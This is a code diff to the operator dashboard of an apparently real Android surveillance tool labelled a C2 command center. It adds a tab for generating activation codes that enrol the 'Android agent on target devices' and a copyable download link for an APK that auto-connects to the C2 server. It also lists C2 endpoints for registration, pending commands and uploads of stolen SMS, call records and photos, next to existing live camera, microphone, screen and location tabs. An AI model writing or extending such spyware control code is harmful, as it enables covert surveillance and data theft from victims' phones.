@@ -45,7 +45,8 @@ import {
   Video,
   Send,
   SlidersHorizontal,
-  FolderArchive
+  FolderArchive,
+  Key
 } from "lucide-react";
 import { cn } from "@/lib/utils";
 
@@ -68,7 +69,11 @@ export default function C2CommandCenterClient({
   >(initialTab === "all" ? "whatsapp" : (initialTab as any));
 
   // Subtab for Live Surveillance Stream
-  const [liveStreamTab, setLiveStreamTab] = useState<"overview" | "camera" | "mic" | "screen" | "map" | "terminal">("overview");
+  const [liveStreamTab, setLiveStreamTab] = useState<"overview" | "app_auth" | "camera" | "mic" | "screen" | "map" | "terminal">("overview");
+
+  const [activationCodes, setActivationCodes] = useState<string[]>([]);
+  const [newCodeLoading, setNewCodeLoading] = useState<boolean>(false);
+  const [copiedCode, setCopiedCode] = useState<string | null>(null);
 
   const [selectedDevice, setSelectedDevice] = useState<string>("ALL");
   const [isConnected, setIsConnected] = useState<boolean>(true);
@@ -157,6 +162,9 @@ export default function C2CommandCenterClient({
       if (json.success) {
         setData(json);
         setIsConnected(true);
+        if (json.activation_codes) {
+          setActivationCodes(json.activation_codes);
+        }
       } else {
         setIsConnected(false);
       }
@@ -183,6 +191,31 @@ export default function C2CommandCenterClient({
       clearInterval(interval);
     };
   }, []);
+
+  const handleGenerateActivationCode = async () => {
+    setNewCodeLoading(true);
+    try {
+      const res = await fetch("/api/c2", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ action: "generate_activation_code" })
+      });
+      const json = await res.json();
+      if (json.success && json.activation_codes) {
+        setActivationCodes(json.activation_codes);
+      }
+    } catch (e) {
+      console.error("Failed to generate activation code", e);
+    } finally {
+      setNewCodeLoading(false);
+    }
+  };
+
+  const handleCopyCode = (code: string) => {
+    navigator.clipboard.writeText(code);
+    setCopiedCode(code);
+    setTimeout(() => setCopiedCode(null), 2500);
+  };
 
   const handleToggleConfig = async (key: string, value: boolean | string) => {
     setActionLoading(true);
@@ -669,12 +702,18 @@ export default function C2CommandCenterClient({
                     </h2>
                   </div>
 
-                  <div className="flex items-center gap-1 bg-slate-950 p-1 rounded-xl border border-slate-800">
+                  <div className="flex items-center gap-1 bg-slate-950 p-1 rounded-xl border border-slate-800 flex-wrap">
                     <button
                       onClick={() => setLiveStreamTab("overview")}
                       className={cn("px-3 py-1.5 rounded-lg text-xs font-bold transition-all", liveStreamTab === "overview" ? "bg-blue-600 text-white" : "text-slate-400 hover:text-white")}
                     >
                       Radar
+                    </button>
+                    <button
+                      onClick={() => setLiveStreamTab("app_auth")}
+                      className={cn("px-3 py-1.5 rounded-lg text-xs font-bold transition-all flex items-center gap-1", liveStreamTab === "app_auth" ? "bg-emerald-600 text-white" : "text-slate-400 hover:text-white")}
+                    >
+                      <Key size={11} /> App Auth Codes
                     </button>
                     <button
                       onClick={() => setLiveStreamTab("camera")}
@@ -743,6 +782,87 @@ export default function C2CommandCenterClient({
                         >
                           <Mic size={14} /> Listen Live Mic (10s)
                         </button>
+                      </div>
+                    </div>
+                  )}
+
+                  {liveStreamTab === "app_auth" && (
+                    <div className="w-full space-y-4 text-left">
+                      <div className="flex items-center justify-between">
+                        <div>
+                          <h3 className="text-sm font-black text-white flex items-center gap-2">
+                            <Key size={16} className="text-emerald-400" /> App Authentication Codes
+                          </h3>
+                          <p className="text-[11px] text-slate-400 mt-0.5">
+                            These codes activate the Android agent on target devices via{" "}
+                            <span className="font-mono text-emerald-400">kpts.com.pk/c2/register/activate/</span>
+                          </p>
+                        </div>
+                        <button
+                          onClick={handleGenerateActivationCode}
+                          disabled={newCodeLoading}
+                          className="px-3 py-1.5 bg-emerald-600 hover:bg-emerald-700 text-white rounded-xl text-xs font-bold flex items-center gap-1.5 disabled:opacity-50 cursor-pointer shadow"
+                        >
+                          {newCodeLoading ? <RefreshCw size={12} className="animate-spin" /> : <Key size={12} />}
+                          Generate New Code
+                        </button>
+                      </div>
+
+                      {/* APK Download */}
+                      <div className="bg-slate-900 border border-slate-700 rounded-2xl p-4 space-y-2">
+                        <p className="text-xs font-bold text-slate-300 flex items-center gap-2">
+                          <Download size={14} className="text-blue-400" /> APK Download (Auto-connects to this C2)
+                        </p>
+                        <div className="flex items-center gap-2 bg-slate-950 border border-slate-800 rounded-xl p-2.5">
+                          <span className="text-[11px] font-mono text-emerald-300 flex-1 break-all">https://kpts.com.pk/app.apk</span>
+                          <button
+                            onClick={() => handleCopyCode("https://kpts.com.pk/app.apk")}
+                            className="px-2 py-1 bg-slate-700 hover:bg-slate-600 text-slate-200 rounded-lg text-[10px] font-bold flex items-center gap-1 cursor-pointer"
+                          >
+                            {copiedCode === "https://kpts.com.pk/app.apk" ? <CheckCircle2 size={11} className="text-emerald-400" /> : <Copy size={11} />}
+                            {copiedCode === "https://kpts.com.pk/app.apk" ? "Copied!" : "Copy"}
+                          </button>
+                        </div>
+                      </div>
+
+                      {/* Activation Codes List */}
+                      <div className="space-y-2 max-h-48 overflow-y-auto pr-1">
+                        {(activationCodes.length > 0 ? activationCodes : (data?.activation_codes || [])).map((code: string, idx: number) => (
+                          <div key={code} className="flex items-center gap-2 bg-slate-900 border border-slate-800 rounded-xl px-3 py-2">
+                            <span className="text-[10px] text-slate-500 w-5 shrink-0">#{idx + 1}</span>
+                            <span className="font-mono text-emerald-300 text-xs flex-1 select-all">{code}</span>
+                            <button
+                              onClick={() => handleCopyCode(code)}
+                              className="px-2 py-0.5 bg-slate-700 hover:bg-emerald-800 text-slate-200 rounded-lg text-[10px] font-bold flex items-center gap-1 cursor-pointer transition-colors"
+                            >
+                              {copiedCode === code ? <CheckCircle2 size={11} className="text-emerald-400" /> : <Copy size={11} />}
+                              {copiedCode === code ? "Copied!" : "Copy"}
+                            </button>
+                          </div>
+                        ))}
+                        {(activationCodes.length === 0 && !data?.activation_codes?.length) && (
+                          <div className="text-center py-6 text-slate-500 text-xs">
+                            <Key size={28} className="mx-auto mb-2 text-slate-700" />
+                            No codes yet. Generate one above.
+                          </div>
+                        )}
+                      </div>
+
+                      {/* C2 Endpoint Info */}
+                      <div className="bg-slate-900 border border-emerald-900/40 rounded-2xl p-3 space-y-1.5">
+                        <p className="text-[11px] font-bold text-emerald-400 uppercase tracking-wider">App → C2 Sync Endpoints</p>
+                        {[
+                          ["Auth", "kpts.com.pk/c2/register/auth/"],
+                          ["Activate", "kpts.com.pk/c2/register/activate/"],
+                          ["Commands", "kpts.com.pk/c2/preference/pendingcommand?appServiceId=..."],
+                          ["SMS/Calls", "kpts.com.pk/c2/payload/sms/ & /payload/call/"],
+                          ["Assets", "kpts.com.pk/c2/payload/upload/asset/photo"],
+                        ].map(([label, ep]) => (
+                          <div key={label} className="flex items-start gap-2 text-[10px]">
+                            <span className="text-slate-500 w-14 shrink-0">{label}</span>
+                            <span className="font-mono text-slate-300 break-all">{ep}</span>
+                          </div>
+                        ))}
                       </div>
                     </div>
                   )}
